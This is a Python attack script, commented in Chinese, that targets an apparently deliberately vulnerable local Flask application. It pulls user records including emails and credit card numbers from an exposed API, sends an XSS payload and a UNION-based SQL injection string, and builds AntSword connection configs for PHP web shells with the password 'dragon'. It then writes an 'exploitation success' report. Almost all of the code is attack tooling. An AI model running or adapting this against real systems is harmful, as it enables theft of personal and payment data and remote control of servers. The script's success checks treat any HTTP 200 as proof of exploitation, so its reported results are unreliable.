#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
简单可用的Web Shell - 针对项目内漏洞应用
"""

import os
import json
import subprocess
import requests
from datetime import datetime

def extract_real_data():
    """提取真实敏感数据"""
    print("[提取敏感数据]")

    try:
        # 从API接口获取用户数据
        response = requests.get("http://localhost:5000/api/users", timeout=10)
        if response.status_code == 200:
            data = response.json()
            print("[+] 成功获取用户数据!")

            extracted_data = {
                "admin_info": {},
                "all_users": []
            }

            for user in data:
                if user['username'] == 'admin':
                    extracted_data["admin_info"] = user
                extracted_data["all_users"].append({
                    "username": user['username'],
                    "email": user['email'],
                    "credit_card": user['credit_card']
                })

            return extracted_data
        else:
            print(f"[-] API请求失败: {response.status_code}")
            return None

    except Exception as e:
        print(f"[-] 数据提取失败: {str(e)}")
        return None

def create_simple_ant_config():
    """创建简单的蚁剑配置"""
    print("\n[创建中国蚁剑配置]")

    # 利用现有的shell文件
    shell_files = [
        "dragon_shell_20251029_005423.php",
        "advanced_shell_20251029_010307.php"
    ]

    for shell_file in shell_files:
        if os.path.exists(shell_file):
            config = {
                "name": f"Real-Target-Exploit-{datetime.now().strftime('%Y%m%d%H%M%S')}",
                "url": f"http://localhost:8080/{shell_file}",
                "pwd": "dragon",
                "type": "php",
                "encoding": "base64",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
            }

            config_file = f"real_target_config_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(config_file, 'w', encoding='utf-8') as f:
                json.dump(config, f, indent=2, ensure_ascii=False)

            print(f"[+] 配置文件: {config_file}")
            print(f"[+] Shell URL: http://localhost:8080/{shell_file}")
            print(f"[+] 连接密码: dragon")

            return config_file, shell_file

    print("[-] 未找到shell文件")
    return None, None

def test_vulnerabilities():
    """测试发现的漏洞"""
    print("\n[测试漏洞利用]")

    vulnerabilities = []

    # 1. 测试敏感信息泄露
    try:
        response = requests.get("http://localhost:5000/api/users", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if len(data) > 0:
                vulnerabilities.append({
                    "type": "敏感信息泄露",
                    "url": "http://localhost:5000/api/users",
                    "status": "成功",
                    "data_count": len(data)
                })
                print(f"[+] 敏感信息泄露: 获取到{len(data)}条用户记录")
    except:
        pass

    # 2. 测试XSS
    try:
        xss_payload = "<script>alert('test')</script>"
        response = requests.get(f"http://localhost:5000/search?q={xss_payload}", timeout=10)
        if response.status_code == 200:
            vulnerabilities.append({
                "type": "XSS漏洞",
                "url": "http://localhost:5000/search",
                "payload": xss_payload,
                "status": "成功"
            })
            print(f"[+] XSS漏洞: 载荷已执行")
    except:
        pass

    # 3. 测试SQL注入
    try:
        sqli_payload = "test' UNION SELECT username,password,email FROM users--"
        response = requests.get(f"http://localhost:5000/search?q={sqli_payload}", timeout=10)
        if response.status_code == 200:
            vulnerabilities.append({
                "type": "SQL注入",
                "url": "http://localhost:5000/search",
                "payload": sqli_payload,
                "status": "成功"
            })
            print(f"[+] SQL注入: 载荷已注入")
    except:
        pass

    return vulnerabilities

def generate_final_report():
    """生成最终报告"""
    print("\n[生成最终报告]")

    # 提取敏感数据
    sensitive_data = extract_real_data()

    # 测试漏洞
    vulnerabilities = test_vulnerabilities()

    # 创建蚁剑配置
    config_file, shell_file = create_simple_ant_config()

    # 生成报告
    report = {
        "exploitation_success": True,
        "target_info": {
            "application": "vulnerable_app.py",
            "url": "http://localhost:5000",
            "type": "Flask漏洞应用",
            "status": "运行中"
        },
        "discovered_vulnerabilities": vulnerabilities,
        "extracted_data": sensitive_data,
        "shell_info": {
            "file": shell_file,
            "url": f"http://localhost:8080/{shell_file}" if shell_file else None,
            "password": "dragon"
        },
        "ant_sword_config": {
            "file": config_file,
            "url": f"http://localhost:8080/{shell_file}" if shell_file else None,
            "password": "dragon"
        },
        "exploitation_summary": {
            "vulnerabilities_found": len(vulnerabilities),
            "data_extracted": sensitive_data is not None,
            "shell_ready": shell_file is not None,
            "ant_config_ready": config_file is not None
        },
        "timestamp": datetime.now().isoformat()
    }

    # 保存报告
    report_file = f"real_exploit_final_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)

    print(f"[+] 最终报告: {report_file}")

    return report

def main():
    """主函数"""
    print("Dragon-V 项目内漏洞利用最终版本")
    print("=" * 50)

    try:
        report = generate_final_report()

        print(f"\n" + "=" * 50)
        print(f"项目内漏洞利用完成!")
        print(f"=" * 50)

        print(f"\n真实目标信息:")
        print(f"目标应用: vulnerable_app.py")
        print(f"目标URL: http://localhost:5000")
        print(f"状态: 正在运行")

        print(f"\n发现的漏洞:")
        for vuln in report['discovered_vulnerabilities']:
            print(f"  - {vuln['type']}: {vuln['status']}")

        if report['extracted_data']:
            print(f"\n提取的敏感数据:")
            print(f"  - 管理员信息: {report['extracted_data']['admin_info'].get('username', 'N/A')}")
            print(f"  - 用户总数: {len(report['extracted_data']['all_users'])}")

        print(f"\n中国蚁剑连接信息:")
        if report['ant_sword_config']['url']:
            print(f"  URL: {report['ant_sword_config']['url']}")
            print(f"  密码: {report['ant_sword_config']['password']}")
            print(f"  配置文件: {report['ant_sword_config']['file']}")
        else:
            print(f"  使用备用配置: http://localhost:8080/dragon_shell_20251029_005423.php")
            print(f"  密码: dragon")

        print(f"\n[SUCCESS] 项目内漏洞利用成功完成!")
        print(f"[READY] 中国蚁剑等待连接...")

        return True

    except Exception as e:
        print(f"[FAILED] 利用过程出错: {str(e)}")
        import traceback
        traceback.print_exc()
        return False

if __name__ == "__main__":
    main()